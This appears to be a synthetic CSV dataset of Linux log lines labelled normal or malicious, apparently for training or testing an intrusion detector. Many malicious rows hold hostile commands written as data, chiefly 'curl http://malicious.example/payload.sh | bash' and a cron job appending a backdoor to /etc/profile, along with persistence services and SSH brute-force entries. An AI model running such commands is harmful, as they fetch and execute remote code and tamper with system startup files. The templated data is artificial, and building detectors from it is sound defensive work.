id,log_text,label
8708,bash[1376]: curl http://malicious.example/payload.sh | bash,malicious
8709,systemd[1]: Created malicious service persistence_8543.service,malicious
8710,systemd[1]: Started Session 8831 of user root.,normal
8711,systemd[1]: Started Session 5394 of user root.,normal
8712,CRON[5251]: (root) CMD (uptime),normal
8713,bash[7078]: curl http://malicious.example/payload.sh | bash,malicious
8714,kernel: [ 4533.29 ] Module loaded: suspicious_mod,malicious
8715,CRON[3134]: (root) CMD (pwd),normal
8716,systemd[1]: Created malicious service persistence_8785.service,malicious
8717,sshd[2116]: Accepted publickey for user from 192.168.9.52 port 22 ssh2,normal
8718,sshd[7221]: Failed password for invalid user admin from 5.188.253.177 port 22 ssh2,malicious
8719,networkd: DHCPv4 address assigned to eth0,normal
8720,CRON[3483]: (root) CMD (pwd),normal
8721,CRON[6364]: (root) CMD (ls),normal
8722,networkd: DHCPv4 address assigned to eth0,normal
8723,sshd[1424]: Accepted publickey for user from 192.168.27.152 port 22 ssh2,normal
8724,bash[7328]: curl http://malicious.example/payload.sh | bash,malicious
8725,kernel: [ 5419.07 ] USB device plugged,normal
8726,CRON[9563]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8727,CRON[4590]: (root) CMD (uptime),normal
8728,networkd: DHCPv4 address assigned to eth0,normal
8729,systemd[1]: Started Session 6484 of user root.,normal
8730,systemd[1]: Created malicious service persistence_8760.service,malicious
8731,systemd[1]: Started Session 6214 of user root.,normal
8732,sshd[9792]: Failed password for invalid user admin from 5.188.19.38 port 22 ssh2,malicious
8733,CRON[7187]: (root) CMD (whoami),normal
8734,sshd[8492]: Accepted publickey for user from 192.168.185.249 port 22 ssh2,normal
8735,systemd[1]: Created malicious service persistence_3343.service,malicious
8736,kernel: [ 1206.68 ] Module loaded: suspicious_mod,malicious
8737,sshd[1630]: Failed password for invalid user admin from 5.188.148.176 port 22 ssh2,malicious
8738,bash[1305]: curl http://malicious.example/payload.sh | bash,malicious
8739,kernel: [ 3985.76 ] Module loaded: suspicious_mod,malicious
8740,CRON[9585]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8741,kernel: [ 5605.44 ] Module loaded: suspicious_mod,malicious
8742,sshd[1607]: Failed password for invalid user admin from 5.188.84.41 port 22 ssh2,malicious
8743,bash[9254]: curl http://malicious.example/payload.sh | bash,malicious
8744,sshd[8266]: Accepted publickey for user from 192.168.112.11 port 22 ssh2,normal
8745,CRON[9240]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8746,kernel: [ 8532.18 ] Module loaded: suspicious_mod,malicious
8747,sshd[8714]: Failed password for invalid user admin from 5.188.68.245 port 22 ssh2,malicious
8748,networkd: DHCPv4 address assigned to eth0,normal
8749,sshd[7407]: Failed password for invalid user admin from 5.188.105.39 port 22 ssh2,malicious
8750,sshd[6514]: Failed password for invalid user admin from 5.188.139.227 port 22 ssh2,malicious
8751,networkd: DHCPv4 address assigned to eth0,normal
8752,sshd[8306]: Failed password for invalid user admin from 5.188.60.121 port 22 ssh2,malicious
8753,sshd[7277]: Accepted publickey for user from 192.168.24.129 port 22 ssh2,normal
8754,kernel: [ 3554.01 ] Module loaded: suspicious_mod,malicious
8755,bash[2591]: curl http://malicious.example/payload.sh | bash,malicious
8756,CRON[7068]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8757,sshd[8137]: Failed password for invalid user admin from 5.188.35.65 port 22 ssh2,malicious
8758,CRON[4900]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8759,CRON[2318]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8760,bash[8984]: curl http://malicious.example/payload.sh | bash,malicious
8761,CRON[2191]: (root) CMD (ls),normal
8762,systemd[1]: Created malicious service persistence_8985.service,malicious
8763,bash[1489]: curl http://malicious.example/payload.sh | bash,malicious
8764,bash[3714]: curl http://malicious.example/payload.sh | bash,malicious
8765,sshd[7960]: Accepted publickey for user from 192.168.5.148 port 22 ssh2,normal
8766,sshd[1103]: Failed password for invalid user admin from 5.188.31.162 port 22 ssh2,malicious
8767,CRON[1854]: (root) CMD (whoami),normal
8768,systemd[1]: Started Session 7703 of user root.,normal
8769,networkd: DHCPv4 address assigned to eth0,normal
8770,networkd: DHCPv4 address assigned to eth0,normal
8771,systemd[1]: Started Session 4035 of user root.,normal
8772,networkd: DHCPv4 address assigned to eth0,normal
8773,systemd[1]: Started Session 6663 of user root.,normal
8774,sshd[6172]: Accepted publickey for user from 192.168.37.144 port 22 ssh2,normal
8775,CRON[8016]: (root) CMD (uptime),normal
8776,bash[5035]: curl http://malicious.example/payload.sh | bash,malicious
8777,CRON[2505]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8778,networkd: DHCPv4 address assigned to eth0,normal
8779,sshd[7321]: Failed password for invalid user admin from 5.188.188.169 port 22 ssh2,malicious
8780,CRON[7744]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8781,kernel: [ 9921.83 ] USB device plugged,normal
8782,CRON[5045]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8783,kernel: [ 4459.92 ] USB device plugged,normal
8784,kernel: [ 594.77 ] Module loaded: suspicious_mod,malicious
8785,sshd[9937]: Failed password for invalid user admin from 5.188.51.152 port 22 ssh2,malicious
8786,sshd[3559]: Failed password for invalid user admin from 5.188.82.42 port 22 ssh2,malicious
8787,CRON[3369]: (root) CMD (pwd),normal
8788,systemd[1]: Started Session 2320 of user root.,normal
8789,systemd[1]: Created malicious service persistence_8695.service,malicious
8790,CRON[9348]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8791,sshd[6454]: Accepted publickey for user from 192.168.194.2 port 22 ssh2,normal
8792,networkd: DHCPv4 address assigned to eth0,normal
8793,networkd: DHCPv4 address assigned to eth0,normal
8794,systemd[1]: Created malicious service persistence_2316.service,malicious
8795,systemd[1]: Started Session 3129 of user root.,normal
8796,sshd[8097]: Accepted publickey for user from 192.168.7.34 port 22 ssh2,normal
8797,networkd: DHCPv4 address assigned to eth0,normal
8798,CRON[4698]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8799,kernel: [ 6942.69 ] Module loaded: suspicious_mod,malicious
8800,sshd[2207]: Failed password for invalid user admin from 5.188.136.12 port 22 ssh2,malicious
8801,sshd[9641]: Accepted publickey for user from 192.168.231.179 port 22 ssh2,normal
8802,CRON[4108]: (root) CMD (uptime),normal
8803,sshd[6987]: Failed password for invalid user admin from 5.188.25.22 port 22 ssh2,malicious
8804,systemd[1]: Created malicious service persistence_5784.service,malicious
8805,CRON[6425]: (root) CMD (whoami),normal
8806,networkd: DHCPv4 address assigned to eth0,normal
8807,systemd[1]: Created malicious service persistence_5195.service,malicious
8808,networkd: DHCPv4 address assigned to eth0,normal
8809,sshd[7207]: Failed password for invalid user admin from 5.188.205.207 port 22 ssh2,malicious
8810,kernel: [ 235.89 ] USB device plugged,normal
8811,systemd[1]: Started Session 4495 of user root.,normal
8812,CRON[7336]: (root) CMD (whoami),normal
8813,systemd[1]: Started Session 1117 of user root.,normal
8814,networkd: DHCPv4 address assigned to eth0,normal
8815,networkd: DHCPv4 address assigned to eth0,normal
8816,CRON[6001]: (root) CMD (ls),normal
8817,kernel: [ 4978.71 ] Module loaded: suspicious_mod,malicious
8818,CRON[7225]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8819,sshd[1102]: Accepted publickey for user from 192.168.141.214 port 22 ssh2,normal
8820,networkd: DHCPv4 address assigned to eth0,normal
8821,CRON[8669]: (root) CMD (pwd),normal
8822,systemd[1]: Started Session 4397 of user root.,normal
8823,bash[9155]: curl http://malicious.example/payload.sh | bash,malicious
8824,CRON[3962]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8825,systemd[1]: Started Session 3254 of user root.,normal
8826,networkd: DHCPv4 address assigned to eth0,normal
8827,kernel: [ 7326.83 ] USB device plugged,normal
8828,kernel: [ 2015.23 ] USB device plugged,normal
8829,sshd[7547]: Failed password for invalid user admin from 5.188.211.41 port 22 ssh2,malicious
8830,CRON[4991]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8831,networkd: DHCPv4 address assigned to eth0,normal
8832,kernel: [ 4751.44 ] Module loaded: suspicious_mod,malicious
8833,CRON[6479]: (root) CMD (pwd),normal
8834,bash[8327]: curl http://malicious.example/payload.sh | bash,malicious
8835,systemd[1]: Created malicious service persistence_3878.service,malicious
8836,kernel: [ 9724.72 ] Module loaded: suspicious_mod,malicious
8837,networkd: DHCPv4 address assigned to eth0,normal
8838,kernel: [ 2202.89 ] Module loaded: suspicious_mod,malicious
8839,kernel: [ 1148.68 ] USB device plugged,normal
8840,kernel: [ 4304.75 ] USB device plugged,normal
8841,sshd[2306]: Failed password for invalid user admin from 5.188.15.158 port 22 ssh2,malicious
8842,networkd: DHCPv4 address assigned to eth0,normal
8843,bash[4127]: curl http://malicious.example/payload.sh | bash,malicious
8844,sshd[8008]: Failed password for invalid user admin from 5.188.96.54 port 22 ssh2,malicious
8845,networkd: DHCPv4 address assigned to eth0,normal
8846,kernel: [ 9480.88 ] USB device plugged,normal
8847,networkd: DHCPv4 address assigned to eth0,normal
8848,systemd[1]: Created malicious service persistence_2157.service,malicious
8849,kernel: [ 3884.9 ] Module loaded: suspicious_mod,malicious
8850,systemd[1]: Created malicious service persistence_7010.service,malicious
8851,CRON[8717]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8852,sshd[4131]: Accepted publickey for user from 192.168.78.253 port 22 ssh2,normal
8853,CRON[3664]: (root) CMD (uptime),normal
8854,systemd[1]: Created malicious service persistence_8646.service,malicious
8855,sshd[1575]: Accepted publickey for user from 192.168.63.233 port 22 ssh2,normal
8856,sshd[7748]: Failed password for invalid user admin from 5.188.194.252 port 22 ssh2,malicious
8857,CRON[2735]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8858,bash[7133]: curl http://malicious.example/payload.sh | bash,malicious
8859,CRON[7320]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8860,systemd[1]: Started Session 3323 of user root.,normal
8861,kernel: [ 9571.05 ] Module loaded: suspicious_mod,malicious
8862,networkd: DHCPv4 address assigned to eth0,normal
8863,sshd[8674]: Accepted publickey for user from 192.168.75.60 port 22 ssh2,normal
8864,kernel: [ 5602.96 ] USB device plugged,normal
8865,networkd: DHCPv4 address assigned to eth0,normal
8866,systemd[1]: Created malicious service persistence_3586.service,malicious
8867,networkd: DHCPv4 address assigned to eth0,normal
8868,CRON[7984]: (root) CMD (ls),normal
8869,bash[6915]: curl http://malicious.example/payload.sh | bash,malicious
8870,CRON[6496]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8871,sshd[3017]: Accepted publickey for user from 192.168.219.141 port 22 ssh2,normal
8872,CRON[3014]: (root) CMD (pwd),normal
8873,networkd: DHCPv4 address assigned to eth0,normal
8874,sshd[5981]: Failed password for invalid user admin from 5.188.39.231 port 22 ssh2,malicious
8875,sshd[1158]: Failed password for invalid user admin from 5.188.241.111 port 22 ssh2,malicious
8876,systemd[1]: Started Session 9600 of user root.,normal
8877,sshd[8690]: Accepted publickey for user from 192.168.168.254 port 22 ssh2,normal
8878,bash[1295]: curl http://malicious.example/payload.sh | bash,malicious
8879,CRON[7923]: (root) CMD (whoami),normal
8880,kernel: [ 7996.94 ] USB device plugged,normal
8881,systemd[1]: Created malicious service persistence_5150.service,malicious
8882,kernel: [ 8878.74 ] Module loaded: suspicious_mod,malicious
8883,kernel: [ 6432.9 ] USB device plugged,normal
8884,networkd: DHCPv4 address assigned to eth0,normal
8885,systemd[1]: Started Session 5960 of user root.,normal
8886,kernel: [ 4581.51 ] USB device plugged,normal
8887,bash[5204]: curl http://malicious.example/payload.sh | bash,malicious
8888,kernel: [ 2156.83 ] Module loaded: suspicious_mod,malicious
8889,sshd[7414]: Failed password for invalid user admin from 5.188.78.101 port 22 ssh2,malicious
8890,CRON[6013]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8891,networkd: DHCPv4 address assigned to eth0,normal
8892,networkd: DHCPv4 address assigned to eth0,normal
8893,systemd[1]: Started Session 7752 of user root.,normal
8894,CRON[8790]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8895,networkd: DHCPv4 address assigned to eth0,normal
8896,CRON[6645]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8897,CRON[4083]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8898,CRON[9113]: (root) CMD (whoami),normal
8899,sshd[5795]: Failed password for invalid user admin from 5.188.13.164 port 22 ssh2,malicious
8900,sshd[2683]: Accepted publickey for user from 192.168.58.170 port 22 ssh2,normal
8901,sshd[5199]: Failed password for invalid user admin from 5.188.104.66 port 22 ssh2,malicious
8902,CRON[8958]: (root) CMD (uptime),normal
8903,CRON[1202]: (root) CMD (ls),normal
8904,CRON[9922]: (root) CMD (whoami),normal
8905,bash[5500]: curl http://malicious.example/payload.sh | bash,malicious
8906,bash[3075]: curl http://malicious.example/payload.sh | bash,malicious
8907,sshd[9830]: Accepted publickey for user from 192.168.175.63 port 22 ssh2,normal
8908,kernel: [ 4297.02 ] Module loaded: suspicious_mod,malicious
8909,sshd[4578]: Accepted publickey for user from 192.168.188.60 port 22 ssh2,normal
8910,sshd[1707]: Accepted publickey for user from 192.168.146.180 port 22 ssh2,normal
8911,bash[3674]: curl http://malicious.example/payload.sh | bash,malicious
8912,systemd[1]: Created malicious service persistence_1591.service,malicious
8913,CRON[2557]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8914,networkd: DHCPv4 address assigned to eth0,normal
8915,bash[3637]: curl http://malicious.example/payload.sh | bash,malicious
8916,networkd: DHCPv4 address assigned to eth0,normal
8917,kernel: [ 2637.99 ] Module loaded: suspicious_mod,malicious
8918,networkd: DHCPv4 address assigned to eth0,normal
8919,sshd[4014]: Failed password for invalid user admin from 5.188.107.2 port 22 ssh2,malicious
8920,systemd[1]: Created malicious service persistence_8389.service,malicious
8921,CRON[4851]: (root) CMD (whoami),normal
8922,bash[9409]: curl http://malicious.example/payload.sh | bash,malicious
8923,systemd[1]: Started Session 2218 of user root.,normal
8924,bash[3937]: curl http://malicious.example/payload.sh | bash,malicious
8925,CRON[8134]: (root) CMD (ls),normal
8926,networkd: DHCPv4 address assigned to eth0,normal
8927,kernel: [ 1009.87 ] Module loaded: suspicious_mod,malicious
8928,sshd[9961]: Failed password for invalid user admin from 5.188.186.58 port 22 ssh2,malicious
8929,networkd: DHCPv4 address assigned to eth0,normal
8930,bash[8058]: curl http://malicious.example/payload.sh | bash,malicious
8931,sshd[5212]: Failed password for invalid user admin from 5.188.190.221 port 22 ssh2,malicious
8932,kernel: [ 4506.56 ] USB device plugged,normal
8933,CRON[5446]: (root) CMD (pwd),normal
8934,networkd: DHCPv4 address assigned to eth0,normal
8935,CRON[5688]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8936,sshd[8752]: Failed password for invalid user admin from 5.188.184.237 port 22 ssh2,malicious
8937,networkd: DHCPv4 address assigned to eth0,normal
8938,kernel: [ 1307.22 ] Module loaded: suspicious_mod,malicious
8939,networkd: DHCPv4 address assigned to eth0,normal
8940,networkd: DHCPv4 address assigned to eth0,normal
8941,CRON[6547]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8942,kernel: [ 1517.64 ] USB device plugged,normal
8943,CRON[2411]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8944,systemd[1]: Created malicious service persistence_4719.service,malicious
8945,sshd[4780]: Accepted publickey for user from 192.168.251.61 port 22 ssh2,normal
8946,kernel: [ 6494.56 ] USB device plugged,normal
8947,networkd: DHCPv4 address assigned to eth0,normal
8948,bash[1701]: curl http://malicious.example/payload.sh | bash,malicious
8949,CRON[2041]: (root) CMD (ls),normal
8950,networkd: DHCPv4 address assigned to eth0,normal
8951,sshd[7390]: Failed password for invalid user admin from 5.188.219.209 port 22 ssh2,malicious
8952,networkd: DHCPv4 address assigned to eth0,normal
8953,bash[3073]: curl http://malicious.example/payload.sh | bash,malicious
8954,kernel: [ 7701.7 ] USB device plugged,normal
8955,CRON[2430]: (root) CMD (pwd),normal
8956,systemd[1]: Created malicious service persistence_6699.service,malicious
8957,kernel: [ 5527.77 ] Module loaded: suspicious_mod,malicious
8958,bash[7980]: curl http://malicious.example/payload.sh | bash,malicious
8959,bash[7480]: curl http://malicious.example/payload.sh | bash,malicious
8960,kernel: [ 909.4 ] Module loaded: suspicious_mod,malicious
8961,sshd[2460]: Accepted publickey for user from 192.168.112.185 port 22 ssh2,normal
8962,networkd: DHCPv4 address assigned to eth0,normal
8963,bash[1767]: curl http://malicious.example/payload.sh | bash,malicious
8964,kernel: [ 2637.43 ] Module loaded: suspicious_mod,malicious
8965,CRON[2646]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8966,systemd[1]: Created malicious service persistence_1909.service,malicious
8967,bash[4979]: curl http://malicious.example/payload.sh | bash,malicious
8968,kernel: [ 9925.35 ] USB device plugged,normal
8969,bash[5871]: curl http://malicious.example/payload.sh | bash,malicious
8970,bash[3094]: curl http://malicious.example/payload.sh | bash,malicious
8971,kernel: [ 16.26 ] USB device plugged,normal
8972,bash[9809]: curl http://malicious.example/payload.sh | bash,malicious
8973,sshd[5072]: Accepted publickey for user from 192.168.93.49 port 22 ssh2,normal
8974,systemd[1]: Started Session 2359 of user root.,normal
8975,bash[5774]: curl http://malicious.example/payload.sh | bash,malicious
8976,kernel: [ 5212.11 ] USB device plugged,normal
8977,networkd: DHCPv4 address assigned to eth0,normal
8978,sshd[6425]: Failed password for invalid user admin from 5.188.55.198 port 22 ssh2,malicious
8979,CRON[8489]: (root) CMD (whoami),normal
8980,systemd[1]: Created malicious service persistence_5153.service,malicious
8981,networkd: DHCPv4 address assigned to eth0,normal
8982,CRON[5301]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8983,systemd[1]: Started Session 8231 of user root.,normal
8984,CRON[4406]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
8985,systemd[1]: Created malicious service persistence_2198.service,malicious
8986,sshd[6767]: Accepted publickey for user from 192.168.139.241 port 22 ssh2,normal
8987,kernel: [ 4822.52 ] USB device plugged,normal
8988,CRON[7723]: (root) CMD (uptime),normal
8989,systemd[1]: Started Session 6970 of user root.,normal
8990,sshd[3797]: Accepted publickey for user from 192.168.185.238 port 22 ssh2,normal
8991,CRON[7996]: (root) CMD (uptime),normal
8992,sshd[2396]: Failed password for invalid user admin from 5.188.152.34 port 22 ssh2,malicious
8993,bash[8385]: curl http://malicious.example/payload.sh | bash,malicious
8994,CRON[1880]: (root) CMD (uptime),normal
8995,bash[7005]: curl http://malicious.example/payload.sh | bash,malicious
8996,kernel: [ 3647.65 ] Module loaded: suspicious_mod,malicious
8997,kernel: [ 8159.23 ] USB device plugged,normal
8998,sshd[7863]: Failed password for invalid user admin from 5.188.40.165 port 22 ssh2,malicious
8999,systemd[1]: Created malicious service persistence_4748.service,malicious
9000,networkd: DHCPv4 address assigned to eth0,normal
9001,sshd[9544]: Accepted publickey for user from 192.168.111.154 port 22 ssh2,normal
9002,sshd[3818]: Accepted publickey for user from 192.168.142.180 port 22 ssh2,normal
9003,kernel: [ 6328.52 ] USB device plugged,normal
9004,CRON[6580]: (root) CMD (uptime),normal
9005,bash[1222]: curl http://malicious.example/payload.sh | bash,malicious
9006,sshd[1350]: Accepted publickey for user from 192.168.146.158 port 22 ssh2,normal
9007,networkd: DHCPv4 address assigned to eth0,normal
9008,bash[4082]: curl http://malicious.example/payload.sh | bash,malicious
9009,sshd[3202]: Accepted publickey for user from 192.168.133.88 port 22 ssh2,normal
9010,CRON[2724]: (root) CMD (pwd),normal
9011,CRON[6373]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9012,networkd: DHCPv4 address assigned to eth0,normal
9013,sshd[1642]: Failed password for invalid user admin from 5.188.134.165 port 22 ssh2,malicious
9014,systemd[1]: Started Session 2900 of user root.,normal
9015,CRON[1349]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9016,CRON[5283]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9017,systemd[1]: Started Session 9061 of user root.,normal
9018,sshd[9735]: Accepted publickey for user from 192.168.199.189 port 22 ssh2,normal
9019,kernel: [ 8441.52 ] Module loaded: suspicious_mod,malicious
9020,sshd[6229]: Failed password for invalid user admin from 5.188.208.78 port 22 ssh2,malicious
9021,CRON[8050]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9022,bash[6853]: curl http://malicious.example/payload.sh | bash,malicious
9023,networkd: DHCPv4 address assigned to eth0,normal
9024,sshd[9863]: Failed password for invalid user admin from 5.188.100.22 port 22 ssh2,malicious
9025,kernel: [ 9113.71 ] Module loaded: suspicious_mod,malicious
9026,CRON[5671]: (root) CMD (ls),normal
9027,CRON[2436]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9028,CRON[5760]: (root) CMD (whoami),normal
9029,sshd[1013]: Failed password for invalid user admin from 5.188.221.254 port 22 ssh2,malicious
9030,CRON[6853]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9031,sshd[3842]: Failed password for invalid user admin from 5.188.190.37 port 22 ssh2,malicious
9032,CRON[8647]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9033,networkd: DHCPv4 address assigned to eth0,normal
9034,CRON[4067]: (root) CMD (pwd),normal
9035,systemd[1]: Started Session 3968 of user root.,normal
9036,kernel: [ 9729.04 ] Module loaded: suspicious_mod,malicious
9037,systemd[1]: Created malicious service persistence_6932.service,malicious
9038,bash[6136]: curl http://malicious.example/payload.sh | bash,malicious
9039,networkd: DHCPv4 address assigned to eth0,normal
9040,systemd[1]: Started Session 5510 of user root.,normal
9041,kernel: [ 638.15 ] Module loaded: suspicious_mod,malicious
9042,sshd[4798]: Failed password for invalid user admin from 5.188.181.94 port 22 ssh2,malicious
9043,systemd[1]: Started Session 3234 of user root.,normal
9044,systemd[1]: Created malicious service persistence_8022.service,malicious
9045,kernel: [ 6304.7 ] Module loaded: suspicious_mod,malicious
9046,networkd: DHCPv4 address assigned to eth0,normal
9047,networkd: DHCPv4 address assigned to eth0,normal
9048,kernel: [ 930.59 ] USB device plugged,normal
9049,CRON[7487]: (root) CMD (uptime),normal
9050,systemd[1]: Created malicious service persistence_6666.service,malicious
9051,CRON[2369]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9052,sshd[8158]: Accepted publickey for user from 192.168.13.172 port 22 ssh2,normal
9053,kernel: [ 6552.54 ] Module loaded: suspicious_mod,malicious
9054,systemd[1]: Created malicious service persistence_5215.service,malicious
9055,CRON[6960]: (root) CMD (pwd),normal
9056,sshd[6118]: Accepted publickey for user from 192.168.222.23 port 22 ssh2,normal
9057,systemd[1]: Started Session 2662 of user root.,normal
9058,kernel: [ 403.87 ] Module loaded: suspicious_mod,malicious
9059,bash[7791]: curl http://malicious.example/payload.sh | bash,malicious
9060,kernel: [ 7892.92 ] Module loaded: suspicious_mod,malicious
9061,sshd[1331]: Failed password for invalid user admin from 5.188.208.47 port 22 ssh2,malicious
9062,sshd[7299]: Accepted publickey for user from 192.168.49.71 port 22 ssh2,normal
9063,bash[5598]: curl http://malicious.example/payload.sh | bash,malicious
9064,systemd[1]: Started Session 4221 of user root.,normal
9065,kernel: [ 4039.26 ] USB device plugged,normal
9066,networkd: DHCPv4 address assigned to eth0,normal
9067,sshd[9026]: Failed password for invalid user admin from 5.188.24.1 port 22 ssh2,malicious
9068,CRON[7615]: (root) CMD (pwd),normal
9069,sshd[1928]: Accepted publickey for user from 192.168.204.193 port 22 ssh2,normal
9070,sshd[7764]: Failed password for invalid user admin from 5.188.241.14 port 22 ssh2,malicious
9071,systemd[1]: Created malicious service persistence_5419.service,malicious
9072,systemd[1]: Created malicious service persistence_9596.service,malicious
9073,bash[6380]: curl http://malicious.example/payload.sh | bash,malicious
9074,kernel: [ 1018.59 ] USB device plugged,normal
9075,systemd[1]: Started Session 1896 of user root.,normal
9076,systemd[1]: Started Session 5376 of user root.,normal
9077,kernel: [ 4401.74 ] Module loaded: suspicious_mod,malicious
9078,networkd: DHCPv4 address assigned to eth0,normal
9079,CRON[6129]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9080,sshd[6564]: Accepted publickey for user from 192.168.174.142 port 22 ssh2,normal
9081,sshd[6245]: Failed password for invalid user admin from 5.188.39.235 port 22 ssh2,malicious
9082,CRON[6562]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9083,systemd[1]: Started Session 5465 of user root.,normal
9084,kernel: [ 8499.61 ] USB device plugged,normal
9085,kernel: [ 4485.88 ] Module loaded: suspicious_mod,malicious
9086,kernel: [ 7556.45 ] Module loaded: suspicious_mod,malicious
9087,bash[4057]: curl http://malicious.example/payload.sh | bash,malicious
9088,systemd[1]: Started Session 1000 of user root.,normal
9089,bash[1127]: curl http://malicious.example/payload.sh | bash,malicious
9090,CRON[6793]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9091,sshd[3430]: Failed password for invalid user admin from 5.188.237.189 port 22 ssh2,malicious
9092,kernel: [ 316.93 ] Module loaded: suspicious_mod,malicious
9093,kernel: [ 7225.75 ] Module loaded: suspicious_mod,malicious
9094,networkd: DHCPv4 address assigned to eth0,normal
9095,bash[8060]: curl http://malicious.example/payload.sh | bash,malicious
9096,networkd: DHCPv4 address assigned to eth0,normal
9097,systemd[1]: Created malicious service persistence_1230.service,malicious
9098,systemd[1]: Started Session 3355 of user root.,normal
9099,CRON[6492]: (root) CMD (pwd),normal
9100,bash[5729]: curl http://malicious.example/payload.sh | bash,malicious
9101,networkd: DHCPv4 address assigned to eth0,normal
9102,systemd[1]: Created malicious service persistence_5091.service,malicious
9103,sshd[5088]: Accepted publickey for user from 192.168.108.129 port 22 ssh2,normal
9104,kernel: [ 1294.61 ] Module loaded: suspicious_mod,malicious
9105,kernel: [ 1995.63 ] USB device plugged,normal
9106,CRON[2441]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9107,CRON[8260]: (root) CMD (whoami),normal
9108,systemd[1]: Created malicious service persistence_2632.service,malicious
9109,systemd[1]: Started Session 7465 of user root.,normal
9110,systemd[1]: Created malicious service persistence_5903.service,malicious
9111,kernel: [ 9063.59 ] USB device plugged,normal
9112,systemd[1]: Created malicious service persistence_8529.service,malicious
9113,kernel: [ 5453.69 ] Module loaded: suspicious_mod,malicious
9114,CRON[1751]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9115,systemd[1]: Started Session 1152 of user root.,normal
9116,CRON[3931]: (root) CMD (ls),normal
9117,CRON[8493]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9118,kernel: [ 7526.42 ] Module loaded: suspicious_mod,malicious
9119,CRON[4229]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
9120,sshd[3204]: Failed password for invalid user admin from 5.188.121.211 port 22 ssh2,malicious
9121,CRON[6404]: (root) CMD (ls),normal
9122,kernel: [ 8688.36 ] USB device plugged,normal
9123,bash[4122]: curl http://malicious.example/payload.sh | bash,malicious
